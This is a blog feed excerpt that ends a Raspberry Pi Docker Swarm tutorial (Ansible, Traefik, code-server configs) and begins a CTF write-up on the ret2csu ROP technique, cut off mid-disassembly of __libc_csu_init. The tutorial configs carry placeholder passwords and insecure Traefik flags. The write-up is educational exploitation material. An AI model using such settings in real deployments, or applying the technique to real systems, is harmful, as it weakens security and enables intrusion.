    <span style="color:#f92672">regexp</span>: <span style="color:#e6db74">&#39;^([\w](?!.*\b{{ item }}\b).*)$&#39;</span>
    <span style="color:#f92672">replace</span>: <span style="color:#e6db74">&#39;\1 {{ item }}&#39;</span>
  <span style="color:#f92672">with_items</span>:
  - <span style="color:#e6db74">&#34;cgroup_enable=cpuset&#34;</span>
  - <span style="color:#e6db74">&#34;cgroup_memory=1&#34;</span>
  - <span style="color:#e6db74">&#34;cgroup_enable=memory&#34;</span>


- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Reboot after enabling containers</span>
  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#f92672">when</span>: <span style="color:#ae81ff">containers_enabled.changed</span>
  <span style="color:#f92672">reboot</span>:
</code></pre></div><p>Here we ensure all necessary packages, GPG keys, and repos are present before installing
<code>docker-ce</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml">---

- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Install Docker Prereqs</span>
  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#f92672">apt</span>:
    <span style="color:#f92672">package</span>: <span style="color:#e6db74">&#34;{{ packages }}&#34;</span>
    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">present</span>

- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Add Docker GPG apt Key</span>
  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#f92672">apt_key</span>:
    <span style="color:#f92672">url</span>: <span style="color:#e6db74">&#34;{{ gpg_key_url }}&#34;</span>
    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">present</span>
    <span style="color:#f92672">keyring</span>: <span style="color:#e6db74">&#34;{{ gpg_key_out }}&#34;</span>

- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Add Docker Repository</span>
  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#f92672">apt_repository</span>:
    <span style="color:#f92672">repo</span>: <span style="color:#e6db74">&#34;deb [arch={{arch}} signed-by={{ gpg_key_out }}] {{ repo_url }}  {{ release }} stable&#34;</span>
    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">present</span>

- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Update apt and install docker-ce</span>
  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#f92672">apt</span>:
    <span style="color:#f92672">package</span>: <span style="color:#e6db74">&#34;{{ docker_packages }}&#34;</span>
    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">latest</span>
    <span style="color:#f92672">update_cache</span>: <span style="color:#66d9ef">yes</span>
</code></pre></div><p>An example of a variable file that needs to exist for the code above to work looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml">
<span style="color:#75715e"># docker installation prerequisites</span>
<span style="color:#f92672">packages</span>:
  - <span style="color:#ae81ff">apt-transport-https</span>
  - <span style="color:#ae81ff">ca-certificates</span>
  - <span style="color:#ae81ff">curl</span>
  - <span style="color:#ae81ff">gnupg</span>
  - <span style="color:#ae81ff">lsb-release</span>

<span style="color:#75715e"># docker repo gpg key location</span>
<span style="color:#f92672">gpg_key_url</span>: <span style="color:#ae81ff">https://download.docker.com/linux/raspbian/gpg</span>

<span style="color:#75715e"># outfile on local disk for docker repo gpg key</span>
<span style="color:#f92672">gpg_key_out</span>: <span style="color:#ae81ff">/usr/share/keyrings/docker-archive-keyring.gpg</span>

<span style="color:#75715e"># components for genreating the `deb` line being added to `/etc/apt/sources.list.d`</span>
<span style="color:#f92672">repo_url</span>: <span style="color:#ae81ff">https://download.docker.com/linux/raspbian</span>
<span style="color:#f92672">release</span>: <span style="color:#ae81ff">buster</span>
<span style="color:#f92672">arch</span>: <span style="color:#ae81ff">armhf</span>

<span style="color:#75715e"># installing docker</span>
<span style="color:#f92672">docker_packages</span>:
  - <span style="color:#ae81ff">docker-ce </span>
  - <span style="color:#ae81ff">docker-ce-cli </span>
  - <span style="color:#ae81ff">containerd.io</span>
</code></pre></div><h4 id="folder-structure">Folder Structure</h4>
<p>All of the tasks can live in a single playbook, we don&rsquo;t need to over complicate things and use
the folder hierarchy that Ansible Docs recommend for managing big fleets.</p>
<p>&hellip;</p>
<p>But we&rsquo;re gonna anyways.</p>
<pre tabindex="0"><code>├── ansible.cfg
├── clusterctrl.yml
├── inventory.list
├── roles
│   ├── clusterctrl
│   │   ├── tasks
│   │   │   ├── main.yml
│   │   │   ├── apt_upgrade.yml
│   │   │   ├── ensure_aptitude.yml
│   │   │   ├── enable_containers.yml
│   │   │   ├── install_docker.yml
│   │   │   ├── docker_group_add.yml
│   │   │   └── swarm_init.yml
│   │   ├── vars
│   │   │   └── main.yml

</code></pre><p>Both simple and hierarchical methods are available here.  <a href="https://github.com/audibleblink/clusterctrl-ansible/">https://github.com/audibleblink/clusterctrl-ansible/</a></p>
<blockquote>
<p><em>Why even talk about the folder structure then?</em><br>
Porque no los dos?</p>
</blockquote>
<p>Some may already have an Ansible repo and most likely have playbooks to manage updates, upgrades,
and user management so it might not make sense to keep those tasks in a single-file play.
Sharing it in this form makes it a bit easier to incorporate to existing Ansible setups. Also, if
someone&rsquo;s just starting their Ansible repo, perhaps this could serve as a starting skeleton</p>
<hr>
<p><strong>Back to the Pis</strong></p>
<p>Once all Pis are up and playbooks intact, run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ansible-playbook clusterctrl.yml
</code></pre></div><h2 id="docker-swarm-init">Docker Swarm Init</h2>
<p>It is possible to both initialize and populate the Swarm with an Ansible play, but it requires some
more setup and the use of plugins. We&rsquo;ll meet in the middle though, and still use Ansible to run the commands
remotely instead of ssh-ing to each. (although that is what&rsquo;s happening in Ansible&rsquo;s background
anyway)</p>
<p>Because of our <code>inventory.list</code> config file in the current directory, on the main Pi, we can run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ansible clusterctrl_server -a <span style="color:#e6db74">&#34;docker swarm init --advertise-addr 172.19.181.254&#34;</span>

<span style="color:#75715e"># If we didn&#39;t have that config file, we&#39;d need to tell `ansibile` where to find our inventory file.</span>
ansible -i /path/to/inventory clusterctrl_server -a <span style="color:#e6db74">&#34;docker swarm init --advertise-addr 172.19.181.254&#34;</span>

</code></pre></div><p>The <code>172</code> IP is for the internal network interface that the Pi Zeros attach to.</p>
<p>We should get an output that includes a line that looks like this:</p>
<pre tabindex="0"><code>docker swarm join \
  --token SWMTKM-1-1y1rdnp7zjcj2vfw7mkhwzrwizqzixzffmoz4wew1brs0vlnh7-4axlaf1luquyxdgdq6gp3jalr \
  172.19.181.254:2377
</code></pre><p>Let&rsquo;s run that command on each node like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ansible clusterctrl_nodes -a <span style="color:#e6db74">&#34;docker swarm join --token SWMTKM-1-1y1rdnp7zjcj2vfw7mkhwzrwizqzixzffmoz4wew1brs0vlnh7-4axlaf1luquyxdgdq6gp3jalr 172.19.181.254:2377&#34;</span>
</code></pre></div><p>Hopefully our output looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ ansible clusterctrl_nodes -a <span style="color:#e6db74">&#34;docker swarm join --token SWMTKN-1-5lyx690gdzra3jw0ijeuug2sifezuohhb51sk6qw00n8dulebq-23l27nw3oxjh2591shgyncp39 172.19.181.254:2377&#34;</span>

carter | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
This node joined a swarm as a worker.
danieljackson | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
This node joined a swarm as a worker.
oneil | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
This node joined a swarm as a worker.
tealc | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
This node joined a swarm as a worker.
</code></pre></div><p>View your new Swarm Cluster with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pi@hammond:~ $ docker node ls
ID                            HOSTNAME        STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION
o4i5q6yu4r3cc01t3nhcvv6nv *   hammond         Ready     Active         Leader           20.10.9
8f4k7jlwlfx60x0aadmjbn350     oneil           Ready     Active                          20.10.9
lpqd72inz9vooxgidyc14o7l6     carter          Ready     Active                          20.10.9
bhbwbtcyaw56oxzvb3hnawr5y     tealc           Ready     Active                          20.10.9
hxplragfdecau0x464s8jf5s9     danieljackson   Ready     Active                          20.10.9
</code></pre></div><h2 id="deploying-our-first-workload">Deploying Our First Workload</h2>
<p>With our cluster ready to receive commands, let&rsquo;s deploy <a href="https://hub.docker.com/r/linuxserver/code-server">code-server</a>
behind the dynamic reverse proxy, Traefik. We&rsquo;ll configure Traefik to also assign valid TLS certs
for our internal network, without having to expose anything to the broader internet by using the
cloudflare DNS challenge functionality build into Traefik.</p>
<p>If you already own a domain name, create/use a cloudflare account and switch the DNS server in
your registrar settings to cloudflare&rsquo;s servers. Then create API tokens for just that DNS zone.
We&rsquo;ll plug it into Traefik so it knows to how to answer DNS challenges from Let&rsquo;s Encrypt.</p>
<p>The service definition for Swarm looks like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;3.8&#34;</span>

<span style="color:#f92672">networks</span>:
  <span style="color:#f92672">proxy</span>:
    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>

<span style="color:#f92672">secrets</span>:
  <span style="color:#f92672">cf_token</span>:
    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>

<span style="color:#f92672">services</span>:

  <span style="color:#f92672">traefik</span>:
    <span style="color:#f92672">image</span>: <span style="color:#e6db74">&#34;traefik:latest&#34;</span>
    <span style="color:#f92672">secrets</span>:
      - <span style="color:#ae81ff">cf_token</span>
    <span style="color:#f92672">environment</span>:
      - <span style="color:#ae81ff">CF_API_EMAIL=sg1@sgc.gov</span>
      - <span style="color:#ae81ff">CF_DNS_API_TOKEN_FILE=/run/secrets/cf_token</span>

    <span style="color:#f92672">command</span>: &gt;<span style="color:#e6db74">
</span><span style="color:#e6db74">      --api.dashboard=true
</span><span style="color:#e6db74">      --api.insecure=true
</span><span style="color:#e6db74">      --providers.docker.swarmmode=true
</span><span style="color:#e6db74">      --providers.docker.exposedbydefault=false
</span><span style="color:#e6db74">      --providers.docker.network=proxy
</span><span style="color:#e6db74">      --providers.file.filename=/traefik_provider.yml
</span><span style="color:#e6db74">      --providers.file.watch=true
</span><span style="color:#e6db74">      --entrypoints.web.address=&#34;:80&#34;
</span><span style="color:#e6db74">      --entrypoints.web.http.redirections.entrypoint.to=websecure
</span><span style="color:#e6db74">      --entrypoints.websecure.address=&#34;:443&#34;
</span><span style="color:#e6db74">      --entrypoints.websecure.http.tls.certresolver=cloudflare
</span><span style="color:#e6db74">      --entrypoints.websecure.http.tls.domains[0].main=chappa.ai
</span><span style="color:#e6db74">      --entrypoints.websecure.http.tls.domains[0].sans=*.chappa.ai
</span><span style="color:#e6db74">      --serverstransport.insecureskipverify=true
</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.email=sg1@sgc.gov
</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.dnschallenge.provider=cloudflare
</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.dnschallenge.resolvers=1.1.1.1:53
</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.storage=/config/acme.json</span>      

    <span style="color:#f92672">networks</span>:
      - <span style="color:#ae81ff">proxy</span>

    <span style="color:#f92672">ports</span>:
      - <span style="color:#ae81ff">80</span>:<span style="color:#ae81ff">80</span>
      - <span style="color:#ae81ff">443</span>:<span style="color:#ae81ff">443</span>

    <span style="color:#f92672">volumes</span>:
      - <span style="color:#e6db74">&#34;/var/run/docker.sock:/var/run/docker.sock:ro&#34;</span>
      - <span style="color:#e6db74">&#34;appdata:/config&#34;</span>

    <span style="color:#f92672">deploy</span>:

      <span style="color:#f92672">placement</span>:
        <span style="color:#f92672">constraints</span>:
          - <span style="color:#e6db74">&#34;node.role == manager&#34;</span>

      <span style="color:#f92672">labels</span>:
        - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.docker.network=proxy&#34;</span>

        - <span style="color:#e6db74">&#34;traefik.http.routers.api.entrypoints=websecure&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.routers.api.tls=true&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.routers.api.rule=Host(`traefik.chappa.ai`)&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.routers.api.service=api@internal&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.services.api.loadbalancer.server.port=8080&#34;</span>

<span style="color:#f92672">volumes</span>:
  <span style="color:#f92672">appdata</span>:
    <span style="color:#f92672">driver_opts</span>:
      <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;cifs&#34;</span>
      <span style="color:#f92672">o</span>: <span style="color:#e6db74">&#34;username=docker,password=swarm,vers=3.0,uid=1000,gid=1000,rw,umask=0177&#34;</span>
      <span style="color:#f92672">device</span>: <span style="color:#e6db74">&#34;//YOUR_NAS_IP/configs/swarm/traefik&#34;</span>
</code></pre></div><p>A couple notes:</p>
<ul>
<li>This config uses Swarm&rsquo;s Secrets functionality. You create them with <code>docker secret create</code>, then
reference them in your service definition.
<ul>
<li>You can also set the <code>CF_DNS_API_TOKEN</code> environment variable manually. The <code>_FILE</code> suffix on
the enivronment variable above is a Swarm-ism so you can use files as string inputs</li>
</ul>
</li>
<li>It uses a Volume, which is an SMB share elsewhere on the network, in order to store persistent
data. This is where we&rsquo;ll save the <code>acme.json</code> file that Traefik gets from cloudflare.</li>
<li>It also enables the Traefik dashboard and API. Useful for getting an overview of everything
deployed through Traefik, but should be disabled if public facing or when not troubleshooting.</li>
<li>Traefik can use many different certificate resolvers, cloudflare is just one of many.</li>
<li>Since Traefik is the ingress for the whole cluster, it is scoped to only be deployed on the
manager node (hammond, in this case)</li>
<li>Whenever you see <code>external: true</code> in Swarm docker-compose files, that means the resource already exists in the
swarm. You&rsquo;ll see that <code>secrets</code> and <code>network</code> both have this key/value. Before deploying this
service, <code>docker network create -d overlay proxy</code></li>
<li>Notice the <code>umask</code> in the volumes block. The eventual <code>acme.json</code> needs to have <code>0600</code>
permissions in order for Traefik to read it in the future. It will complain about the
permissions being overly-permissive and won&rsquo;t use the certs when you browse to your services.</li>
</ul>
<p>When ready, from your server node run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">docker stack deploy -c docker-compose.yml
</code></pre></div><p>This should spin up your Traefik container. Once you attempt to access it at
<code>https://traefik.chappa.ai</code> for the first time, Traefik will conduct the challenge/response dance
necessary to grant you certificates to <code>chappa.ai</code> and a wildcard cert at <code>*.chappa.ai</code> (previously
configured in the service definition above)</p>
<p><img src="3.png" alt=""></p>
<p>Finally, lets deploy code-server, which is VSCode in a browser. Handy for editing things from any
computer, or remote dev on Linux.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;3&#34;</span>

<span style="color:#f92672">networks</span>:
  <span style="color:#f92672">proxy</span>:
    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>

<span style="color:#f92672">services</span>:

  <span style="color:#f92672">code</span>:
    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">linuxserver/code-server:arm32v7-latest</span>
    <span style="color:#f92672">environment</span>:
      - <span style="color:#ae81ff">PUID=1000</span>
      - <span style="color:#ae81ff">PGID=1000</span>
      - <span style="color:#ae81ff">TZ=America/New_York</span>
      - <span style="color:#ae81ff">PROXY_DOMAIN=code.chappa.ai</span>
      - <span style="color:#ae81ff">PASSWORD=password</span> <span style="color:#75715e">#optional</span>
      - <span style="color:#ae81ff">SUDO_PASSWORD=password</span> <span style="color:#75715e">#optional</span>
      <span style="color:#75715e"># - HASHED_PASSWORD= #optional</span>
      <span style="color:#75715e"># - SUDO_PASSWORD_HASH= #optional</span>

    <span style="color:#f92672">networks</span>:
      - <span style="color:#ae81ff">proxy</span>

    <span style="color:#f92672">volumes</span>:
      - <span style="color:#e6db74">&#34;appdata:/config&#34;</span>

    <span style="color:#f92672">ports</span>:
      - <span style="color:#e6db74">&#34;8443:8443&#34;</span>

    <span style="color:#f92672">deploy</span>:

      <span style="color:#f92672">placement</span>:
        <span style="color:#f92672">constraints</span>:
          - <span style="color:#e6db74">&#34;node.role == manager&#34;</span>
      <span style="color:#f92672">labels</span>:
        - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.docker.network=proxy&#34;</span>

        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.entrypoints=websecure&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.tls=true&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.rule=Host(`code.chappa.ai`)&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.service=code-svc&#34;</span>
        - <span style="color:#e6db74">&#34;traefik.http.services.code-svc.loadbalancer.server.port=8443&#34;</span>


<span style="color:#f92672">volumes</span>:
  <span style="color:#f92672">appdata</span>:
    <span style="color:#f92672">driver_opts</span>:
      <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;cifs&#34;</span>
      <span style="color:#f92672">o</span>: <span style="color:#e6db74">&#34;username=docker,password=swarm,vers=3.0,uid=1000,gid=1000,rw&#34;</span>
      <span style="color:#f92672">device</span>: <span style="color:#e6db74">&#34;//YOUR_NAS_IP/configs/swarm/code&#34;</span>
</code></pre></div><p>Notes:</p>
<ul>
<li>We also scope this to the swarm manager because code-server doesn&rsquo;t run on armhfV6 (which is
what my Pi Zeros are). Given compatible architectures, you can remove this constraint and have
many replicas of code-server in order to achieve redundancy.</li>
</ul>
<p>Upon first visit to <code>code.chappa.ai</code>, you&rsquo;ll be granted TLS certs for that domain in the background
before finally loading:</p>
<p><img src="4.png" alt=""></p>
<h2 id="conclusion">Conclusion</h2>
<p>Feel free to stuff your cluster back in your drawer and GO OUTSIDE!</p>
]]></content>
        </item>
        
        <item>
            <title>Ret2CSU</title>
            <link>https://ctrl.red/posts/2021/04/ret2csu/</link>
            <pubDate>Sat, 24 Apr 2021 11:42:16 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2021/04/ret2csu/</guid>
            <description>What is __libc_csu_init anyway? Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event. Let&amp;rsquo;s talk about the System dROP challenge.
A while ago, I&amp;rsquo;d read a BlackHat paper on something called &amp;lsquo;ret2csu&amp;rsquo;. The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there exists two segments of assembly, that when used together, can be very useful in constructing ROP chains without needing bother with any ASLR&amp;rsquo;d library, provided there exists some other useful code within the main ELF.</description>
            <content type="html"><![CDATA[<h1 id="what-is-__libc_csu_init-anyway">What is <code>__libc_csu_init</code> anyway?</h1>
<p>Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event.
Let&rsquo;s talk about the <code>System dROP</code> challenge.</p>
<p>A while ago, I&rsquo;d read a <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">BlackHat paper</a>
on something called &lsquo;ret2csu&rsquo;.
The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there
exists two segments of assembly, that when used together, can be very useful in constructing ROP
chains without needing bother with any ASLR&rsquo;d library, provided there exists some other useful code
within the main ELF. There&rsquo;s an additional hurdle if PIE is enabled, but it remains just that, a
temporary road block.</p>
<p>I hadn&rsquo;t yet run into the need to use it, until this challenge.</p>
<h2 id="sytem-drop">Sytem dROP</h2>
<p>Maybe I didn&rsquo;t <em>need</em> ret2csu. If you take the capital letters (or the flag text itself) from this
challenge, signs point to the use of the SROP, (or SIGret) technique. I didn&rsquo;t go that route. I&rsquo;ve
written about SIGROP before, <a href="https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/">check it
out</a> if you&rsquo;re
interested.</p>
<h2 id="the-gadgets">The Gadgets</h2>
<p>Here&rsquo;s the injected function&rsquo;s disassembled code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0000000000400570</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">__libc_csu_init</span><span style="color:#f92672">&gt;</span>:
  <span style="color:#960050;background-color:#1e0010">400570:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">57</span>                   <span style="color:#a6e22e">push</span>   r15
  <span style="color:#960050;background-color:#1e0010">400572:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">56</span>                   <span style="color:#a6e22e">push</span>   r14
  <span style="color:#960050;background-color:#1e0010">400574:</span>       <span style="color:#960050;background-color:#1e0010">49</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">d7</span>                mov    r15,rdx
  <span style="color:#960050;background-color:#1e0010">400577:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">55</span>                   <span style="color:#a6e22e">push</span>   r13
  <span style="color:#960050;background-color:#1e0010">400579:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">54</span>                   <span style="color:#a6e22e">push</span>   r12
  <span style="color:#960050;background-color:#1e0010">40057</span>b:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>    lea    r12,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20088e</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">600</span>e10 <span style="color:#f92672">&lt;</span>__frame_dummy_init_array_entry<span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">400582:</span>       <span style="color:#960050;background-color:#1e0010">55</span>                      <span style="color:#a6e22e">push</span>   rbp
  <span style="color:#960050;background-color:#1e0010">400583:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>    lea    rbp,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20088e</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">600</span>e18 <span style="color:#f92672">&lt;</span>__do_global_dtors_aux_fini_array_entry<span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">40058</span>a:       <span style="color:#960050;background-color:#1e0010">53</span>                      <span style="color:#a6e22e">push</span>   rbx
  <span style="color:#960050;background-color:#1e0010">40058</span>b:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">fd</span>                mov    r13d,edi
  <span style="color:#960050;background-color:#1e0010">40058</span>e:       <span style="color:#960050;background-color:#1e0010">49</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">f6</span>                mov    r14,rsi
  <span style="color:#960050;background-color:#1e0010">400591:</span>       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">29</span> e5                sub    rbp,r12
  <span style="color:#960050;background-color:#1e0010">400594:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">ec</span> <span style="color:#ae81ff">08</span>             sub    rsp,<span style="color:#ae81ff">0x8</span>
  <span style="color:#960050;background-color:#1e0010">400598:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#a6e22e">c1</span> fd <span style="color:#ae81ff">03</span>             sar    rbp,<span style="color:#ae81ff">0x3</span>
  <span style="color:#960050;background-color:#1e0010">40059</span>c:       <span style="color:#a6e22e">e8</span> <span style="color:#ae81ff">5</span>f fe ff ff          call   <span style="color:#ae81ff">400400</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>a1:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">85</span> <span style="color:#a6e22e">ed</span>                test   rbp,rbp
  <span style="color:#960050;background-color:#1e0010">4005</span>a4:       <span style="color:#960050;background-color:#1e0010">74</span> <span style="color:#960050;background-color:#1e0010">20</span>                   <span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">4005</span>c6 <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x56</span><span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>a6:       <span style="color:#960050;background-color:#1e0010">31</span> <span style="color:#66d9ef">db</span>                   xor    ebx,ebx
  <span style="color:#960050;background-color:#1e0010">4005</span>a8:       <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">f</span> <span style="color:#ae81ff">1</span>f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    nop    <span style="color:#66d9ef">DWORD</span> PTR [rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
  <span style="color:#960050;background-color:#1e0010">4005</span>af:       <span style="color:#960050;background-color:#1e0010">00</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>b0:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> fa                mov    rdx,r15
  <span style="color:#960050;background-color:#1e0010">4005</span>b3:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> f6                mov    rsi,r14
  <span style="color:#960050;background-color:#1e0010">4005</span>b6:       <span style="color:#960050;background-color:#1e0010">44</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">ef</span>                mov    edi,r13d
  <span style="color:#960050;background-color:#1e0010">4005</span>b9:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">14</span> dc             call   <span style="color:#66d9ef">QWORD</span> PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
  <span style="color:#960050;background-color:#1e0010">4005</span>bd:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">c3</span> <span style="color:#ae81ff">01</span>             add    rbx,<span style="color:#ae81ff">0x1</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>c1:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">39</span> <span style="color:#66d9ef">dd</span>                cmp    rbp,rbx
  <span style="color:#960050;background-color:#1e0010">4005</span>c4:       <span style="color:#960050;background-color:#1e0010">75</span> <span style="color:#a6e22e">ea</span>                   jne    <span style="color:#ae81ff">4005</span>b0 <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span><span style="color:#f92672">&gt;</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>c6:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">c4</span> <span style="color:#ae81ff">08</span>             add    rsp,<span style="color:#ae81ff">0x8</span>
  <span style="color:#960050;background-color:#1e0010">4005</span>ca:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">b</span>                      pop    rbx
  <span style="color:#960050;background-color:#1e0010">4005</span>cb:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                      pop    rbp
